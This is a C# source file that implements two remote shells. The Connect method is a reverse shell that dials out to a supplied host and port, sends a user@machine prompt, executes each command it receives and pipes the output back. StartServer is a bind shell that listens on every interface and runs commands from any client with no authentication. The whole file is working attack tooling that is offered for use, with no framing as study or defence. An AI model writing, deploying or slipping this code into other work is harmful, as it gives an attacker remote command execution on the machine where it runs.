using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Net;
using System.Net.Sockets;
using System.Linq;
using System.Diagnostics;
using System.Text;
 public class TcpAssembly
 {
 
  public static void Connect(string address, int port) {
      

        using (var tcp = new TcpClient()) {
            // connect to the tcp server
           
            Console.WriteLine("[+] Connecting to tcp://{0}:{1}", address, port);
            tcp.Connect(address, Convert.ToInt32(port));

            // get tcp stream
            // this is used to send / recieve data
            Console.WriteLine("[!] Getting base stream");
            using (var stream = tcp.GetStream()) {
                // specifically getting reader stream
                // this is a higher api encapsulating the low level stream function and provide more functionality
                Console.WriteLine("[!] Creating stream reader from base stream");
                using (var rdr = new StreamReader(stream)) {
                    while (true) {
                        var prompt = Encoding.ASCII.GetBytes(string.Format("{0}@{1} $ ", Environment.UserName, Environment.MachineName));
                        stream.Write(prompt, 0, prompt.Length);

                        // wait for the text from server
                        string cmd = rdr.ReadLine().Trim().ToLower();

                        // safeguard user input
                        if (cmd == "exit") {
                            break;
                        } else if (string.IsNullOrEmpty(cmd) || string.IsNullOrWhiteSpace(cmd)) {
                            continue;
                        }

                        // get file name to execute
                        // and its arguments
                        string[] parts = cmd.Split(' ');
                        string fileName = parts.First();
                        string[] fileArgs = parts.Skip(1).ToArray();

                        Console.WriteLine("[+] Executing '{0}'", cmd);

                        // instantiate process
                        var process = new Process {
                            StartInfo = new ProcessStartInfo {
                                FileName = fileName,
                                Arguments = string.Join(" ", fileArgs),
                                UseShellExecute = false,
                                RedirectStandardError = true,
                                RedirectStandardOutput = true,

                            }
                        };

                        // start process and handle IO
                        try {
                            process.Start();

                            // copying the stderr and stdout to network stream
                            process.StandardOutput.BaseStream.CopyTo(stream);
                            process.StandardError.BaseStream.CopyTo(stream);

                            process.WaitForExit();
                        } catch (Exception e) {
                            Console.WriteLine("[x] Error executing '{0}'", cmd);
                            var message = Encoding.ASCII.GetBytes(e.Message + "\r\n");
                            stream.Write(message, 0, message.Length);
                        }


                    }

                    // close the reader stream
                    Console.WriteLine("[!] Closing the reader stream");
                    rdr.Close();
                }

                // close the base stream
                Console.WriteLine("[!] Closing the base stream");
                stream.Close();
            }

            // close the tcp connection
            Console.WriteLine("[+] Closing TCP Connection");
            tcp.Close();
        }
    }
  public static void StartServer(int port) {
        IPAddress host = IPAddress.Any;

        // creating the server and listening on the port
        var server = new TcpListener(host, port);
        server.Start();

        while (true) {
            // accepting connection as tcp client
            using (var client = server.AcceptTcpClient()) {
                // get client ip address and port number
                string clientAddr = client.Client.RemoteEndPoint.ToString();

                Console.WriteLine("[+] Client Connected: {0}", clientAddr);

                // get streams
                var stream = client.GetStream();
                var wr = new StreamWriter(stream) { AutoFlush = true };
                var rd = new StreamReader(stream);

                Console.WriteLine("[+] Start Reading Inputs");

                while (true) {
                    // seding the banner and prompt
                    wr.Write(string.Format("{0}@{1} $ ", Environment.UserName, Environment.MachineName));

                    // skip when input is emptpy, null or whitespace
                    // exit if cmd is sent to be exit
                    var cmd = rd.ReadLine().Trim().ToLower();
                    if (string.IsNullOrEmpty(cmd) || string.IsNullOrWhiteSpace(cmd)) {
                        continue;
                    } else if (cmd == "exit") {
                        break;
                    }

                    // preprocess command line recievided from client
                    string[] parts = cmd.Split(' ');
                    string fileName = parts.First();
                    string cmdArgs = string.Join(' ', parts.Skip(1).ToArray());

                    // instantiate process
                    Process process = new Process() {
                        StartInfo = new ProcessStartInfo(fileName, cmdArgs) {
                            UseShellExecute = false,
                            RedirectStandardOutput = true,
                            RedirectStandardError = true
                        }
                    };

                    // spawn process and return output
                    try {
                        process.Start();
                        process.StandardOutput.BaseStream.CopyTo(stream);
                        process.StandardError.BaseStream.CopyTo(stream);
                        process.WaitForExit();
                        Console.WriteLine("[+] Executed '{0}'", cmd);
                    } catch (Exception e) {
                        wr.WriteLine(e.Message);
                        Console.WriteLine("[x] Failed to Execute '{0}'", cmd);
                    }
                }

                Console.WriteLine("[+] Releasing Resources for {0}", clientAddr);
                // closing other stream
                rd.Close();
                wr.Close();
                stream.Close();
            }
        }
    }

 }